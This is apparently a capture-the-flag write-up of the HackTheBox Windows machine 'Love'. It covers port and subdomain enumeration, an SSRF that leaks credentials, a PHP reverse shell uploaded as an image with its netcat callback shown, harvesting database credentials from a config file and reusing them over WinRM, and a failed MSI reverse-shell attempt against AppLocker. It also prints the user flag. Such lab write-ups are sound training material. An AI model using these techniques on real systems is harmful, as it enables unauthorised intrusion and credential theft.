---
title: "Love"
date: 2025-06-20
categories:
  - HackTheBox
  - Windows
tags:
  - HackTheBox
  - Windows
---

# Love

![](assets/Pasted%20image%2020250520224654.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.239
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 22:51 CEST
Nmap scan report for 10.10.10.239
Host is up (0.041s latency).
Not shown: 62980 closed tcp ports (reset), 2536 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Voting System using PHP
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-05-20T21:16:18+00:00; +21m33s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1909 - 2004
Network Distance: 2 hops
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
```

`Port` `5000` is a forbidden site.

`Port` `80` is a voting system login form.

![](assets/Pasted%20image%2020250521122957.png)

Add `love.htb` to `/etc/hosts` and, using `wfuzz`, fuzz subdomains to discover `staging`. This subdomain is already discovered by `nmap` (`ssl-cert: Subject: commonName=staging.love.htb/organizationName=V`).

```shell
$ wfuzz -c --hh 4388 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.love.htb" http://love.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://love.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================

000000067:   200        191 L    404 W      5357 Ch     "staging"                             

Total time: 10.96540
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 454.9763
```

Add `staging.love.htb` to `/etc/hosts` and browse it.

![](assets/Pasted%20image%2020250521123503.png)

Going to the Demo tab, we find a form with an SSRF vulnerability.
If we enter `port` `5000`, which was forbidden, now we can see some credentials.

![](assets/Pasted%20image%2020250521123643.png)

Using `feroxbuster`, we find an `/admin` path on `port` `80`.

![](assets/Pasted%20image%2020250521134910.png)

![](assets/Pasted%20image%2020250521134925.png)

Using the internal `port` credentials:

![](assets/Pasted%20image%2020250521135009.png)

![](assets/Pasted%20image%2020250521135312.png)

## Initial Access

Inside, create a new voter and upload a PHP reverse shell as the user image.

![](assets/Pasted%20image%2020250521160141.png)

Start a listener and open the picture.

```shell
$ sudo rlwrap nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.239] 58482
SOCKET: Shell has connected! PID: 4236
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>whoami
love\phoebe

C:\xampp\htdocs\omrs\images>
```

Get the flag:

```shell
C:\Users\Phoebe\Desktop>type user.txt
8f6bd824be4361a499bbbef404826355
```

## Privilege Escalation

Get SQL connection credentials from the site's config file.

```shell
C:\xampp\htdocs\omrs\includes>type conn.php
<?php
        $conn = new mysqli('localhost', 'phoebe', 'HTB#9826^(_', 'votesystem');

        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }
?>
```

Checking with `nxc`, these are also valid system credentials.

```shell
$ nxc winrm love.htb -u phoebe -p 'HTB#9826^(_'         
WINRM       10.10.10.239    5985   LOVE             [*] Windows 10 / Server 2019 Build 19041 (name:LOVE) (domain:Love)
WINRM       10.10.10.239    5985   LOVE             [+] Love\phoebe:HTB#9826^(_ (Pwn3d!)
```

![](assets/Pasted%20image%2020250521162110.png)

![](assets/Pasted%20image%2020250521164618.png)

Create an MSI reverse shell and execute it like an installer:

```shell
C:\Users\Phoebe\Documents>msiexec /quiet /qn /i reverse.msi
```

But it doesn't work. Checking the `applocker` policy:

```shell
*Evil-WinRM* PS C:\Users\Phoebe\Documents> Get-AppLockerPolicy -Effective | Select -Expandproperty rulecollections
...
PathConditions      : {%OSDRIVE%\Administration\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : e6d62a73-11da-4492-8a56-f620ba7e45d9
Name                : %OSDRIVE%\Administration\*
Description         :
UserOrGroupSid      : S-1-5-21-2955427858-187959437-2037071653-1002
Action              : Allow
```

We can execute it from that folder, but it doesn't work either.

!!! bug

    Following multiple write-ups, I tried from different folders and creating a user instead of getting a reverse shell, but nothing works...
